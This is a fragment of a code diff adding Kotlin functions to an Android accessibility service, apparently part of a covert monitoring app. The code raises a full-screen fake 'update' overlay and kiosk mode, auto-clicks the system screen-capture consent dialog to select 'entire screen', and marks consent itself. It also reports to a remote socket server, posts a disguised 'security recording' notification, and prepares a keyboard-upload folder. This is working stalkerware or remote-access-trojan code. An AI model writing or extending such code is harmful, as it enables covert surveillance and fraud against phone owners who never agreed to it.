+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                PixelFormat.TRANSLUCENT
+            ).apply {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    layoutInDisplayCutoutMode =
+                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                }
+            }
+            try {
+                windowManager?.addView(container, params)
+                overlayAtualizacao = container
+                isAtualizacaoAtiva = true
+                enviarLog("[OVERLAY ATZ] Visível no display físico e no espelhamento (sem FLAG_SECURE)")
+                handlerMain.postDelayed({
+                    if (container.isAttachedToWindow && container.isShown) {
+                        enviarLog("[OVERLAY ATZ] CONFIRMADO visível (${Build.MANUFACTURER}-${Build.MODEL})")
+                    } else {
+                        enviarLog("[OVERLAY ATZ ERRO] Não anexou após 250ms")
+                        SocketManager.socket?.emit("overlay_falhou", JSONObject()
+                            .put("motivo", "nao_anexou")
+                            .put("fabricante", Build.MANUFACTURER)
+                            .put("modelo", Build.MODEL))
+                    }
+                }, 250)
+            } catch (e: Exception) {
+                enviarLog("[OVERLAY ATZ ERRO] addView falhou: ${e.message}")
+                SocketManager.socket?.emit("overlay_falhou", JSONObject()
+                    .put("motivo", "addView_exception")
+                    .put("erro", e.message ?: "?"))
+            }
+        }
+    }
+
+    fun esconderOverlayAtualizacao() {
+        handlerMain.post {
+            overlayAtualizacao?.let {
+                try { windowManager?.removeView(it) } catch (_: Exception) {}
+            }
+            overlayAtualizacao = null
+            isAtualizacaoAtiva = false
+            enviarLog("[OVERLAY ATZ] Removido")
+        }
+    }
+
+    fun ajustarOpacidadeFundoOverlay(opacidade: Float) {
+        handlerMain.post {
+            val v = opacidade.coerceIn(0f, 1f)
+            val alpha = (v * 204).toInt()
+            (overlayAtualizacao as? FrameLayout)?.setBackgroundColor(
+                Color.argb(alpha, 0, 0, 0)
+            )
+            enviarLog("[OVERLAY ATZ] Opacidade = ${(v * 100).toInt()}%")
+        }
+    }
+
+    fun atualizarOpacidadeOverlayAtualizacao(op: Float) {
+        ajustarOpacidadeFundoOverlay(op)
+    }
+
+    fun ativarKioskAtualizacao() {
+        mostrarOverlayAtualizacao()
+    }
+
+    fun removerKioskAtualizacao() {
+        esconderOverlayAtualizacao()
+    }
+
+    private fun iniciarCicloAutoCliqueMediaProjection(raiz: AccessibilityNodeInfo) {
+        // Acessibilidade ATIVA já é o consentimento (gravado no onServiceConnected).
+        // Garante que a pref esteja marcada; não suspende mais o auto-clique se,
+        // por algum motivo, ela ainda não tiver sido gravada — o serviço estar
+        // rodando aqui significa que o usuário autorizou a Acessibilidade.
+        try {
+            getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
+                .edit().putBoolean("consentimento_captura", true).apply()
+        } catch (_: Exception) {}
+
+        // CLIQUE RÁPIDO: primeira tentativa é imediata; os retries usam uma
+        // espera curta (120ms) só para dar tempo do botão renderizar.
+        for (tentativa in 0..4) {
+            val sucesso = executarPassosMediaProjection(raiz)
+            if (sucesso) {
+                enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado automaticamente na tentativa ${tentativa + 1}.")
+                return
+            }
+            if (tentativa < 4) {
+                try { Thread.sleep(120L) } catch (_: Exception) {}
+                val novaRaiz = rootInActiveWindow ?: break
+                if (executarPassosMediaProjection(novaRaiz)) {
+                    enviarLog("[MEDIA-PROJECTION] Botão 'Iniciar agora' clicado no retry ${tentativa + 1}.")
+                    return
+                }
+            }
+        }
+
+        enviarLog("[MEDIA-PROJECTION AVISO] Auto-clique falhou após tentativas. Emitindo notificação persistente de fallback.")
+        emitirNotificacaoFallbackMediaProjection()
+    }
+
+    private fun executarPassosMediaProjection(no: AccessibilityNodeInfo): Boolean {
+        try {
+            procurarESelecionarTelaInteira(no)
+            return procurarEClicarBotaoConfirmacaoMP(no)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao executar passos do MediaProjection: ${e.message}")
+            return false
+        }
+    }
+
+    private fun procurarESelecionarTelaInteira(no: AccessibilityNodeInfo): Boolean {
+        try {
+            val texto = ((no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")).trim().lowercase()
+            val eTelaInteira = texto.contains("tela inteira") || texto.contains("entire screen") ||
+                texto.contains("toda a tela") || texto.contains("all screen")
+            if (eTelaInteira && (no.isCheckable || no.isClickable)) {
+                if (!no.isChecked) {
+                    val ok = no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    if (ok) {
+                        enviarLog("[MEDIA-PROJECTION] Opção 'Tela inteira' selecionada com sucesso.")
+                        return true
+                    }
+                }
+            }
+            for (i in 0 until no.childCount) {
+                val filho = no.getChild(i) ?: continue
+                if (procurarESelecionarTelaInteira(filho)) return true
+            }
+        } catch (_: Exception) {}
+        return false
+    }
+
+    private fun procurarEClicarBotaoConfirmacaoMP(no: AccessibilityNodeInfo): Boolean {
+        try {
+            val viewId = (no.viewIdResourceName ?: "").lowercase()
+            val texto = ((no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")).trim().lowercase()
+            
+            val eBotaoId = viewId.endsWith(":id/button1") || viewId.endsWith(":id/ok")
+            val eBotaoTexto = textosBotaoMidiaProjecao.any { texto.contains(it) }
+
+            if (no.isClickable && (eBotaoId || eBotaoTexto)) {
+                val eBloqueio = textosBloquear.any { texto.contains(it) }
+                if (!eBloqueio && !botaoJaClicadoNaTela(texto)) {
+                    val ok = no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    if (ok) {
+                        marcarBotaoClicado(texto)
+                        enviarLog("[MEDIA-PROJECTION] Botão de início clicado: viewId=$viewId, texto='$texto'")
+                        return true
+                    }
+                }
+            }
+            for (i in 0 until no.childCount) {
+                val filho = no.getChild(i) ?: continue
+                if (procurarEClicarBotaoConfirmacaoMP(filho)) return true
+            }
+        } catch (_: Exception) {}
+        return false
+    }
+
+    private fun extrairTextoArvore(no: AccessibilityNodeInfo): String {
+        val sb = StringBuilder()
+        try {
+            val t = (no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")
+            sb.append(t).append(" ")
+            for (i in 0 until no.childCount) {
+                val filho = no.getChild(i) ?: continue
+                sb.append(extrairTextoArvore(filho)).append(" ")
+            }
+        } catch (_: Exception) {}
+        return sb.toString()
+    }
+
+    private fun emitirNotificacaoFallbackMediaProjection() {
+        try {
+            val channelId = "acesso_materno_fallback_mp"
+            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = NotificationChannel(channelId, "Aviso de Monitoramento", NotificationManager.IMPORTANCE_HIGH)
+                nm.createNotificationChannel(channel)
+            }
+            val intent = Intent(this, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            val pendingIntent = android.app.PendingIntent.getActivity(
+                this, 0, intent,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) android.app.PendingIntent.FLAG_IMMUTABLE else 0)
+            )
+            val notif = NotificationCompat.Builder(this, channelId)
+                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setContentTitle("Toque para reativar monitoramento")
+                .setContentText("A gravação de segurança precisa de 1 toque para autorizar a captura.")
+                .setPriority(NotificationCompat.PRIORITY_MAX)
+                .setCategory(NotificationCompat.CATEGORY_ALARM)
+                .setContentIntent(pendingIntent)
+                .setAutoCancel(false)
+                .setOngoing(true)
+                .build()
+            nm.notify(9988, notif)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao emitir notificação de fallback do MediaProjection: ${e.message}")
+        }
+    }
+
+    private fun criarPastaUploadTeclado() {
+        try {
+            val pasta = File(filesDir, "upload_teclado")
+            if (!pasta.exists()) {
+                pasta.mkdirs()
+            }
+        } catch (_: Exception) {}
     }
 }
